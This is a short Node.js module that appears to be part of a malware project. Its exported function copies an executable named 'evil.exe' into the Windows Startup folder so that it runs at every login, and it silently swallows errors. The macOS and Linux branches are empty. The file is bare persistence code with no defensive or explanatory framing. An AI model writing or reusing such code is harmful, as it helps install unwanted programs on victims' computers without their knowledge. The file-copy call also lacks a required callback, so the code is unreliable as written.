const os = require("os");
const fs = require("fs");

function windowsInstallation() {
  try {
    fs.copyFile(
      "./evil.exe",
      `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe`
    );
  } catch (error) {}
}

function installation() {
  if (os.platform() === "win32") {
    windowsInstallation();
  } else if (os.platform() === "darwin") {
    return "";
  } else if (os.platform() === "linux") {
    return "";
  }
  return "";
}

module.exports = installation;
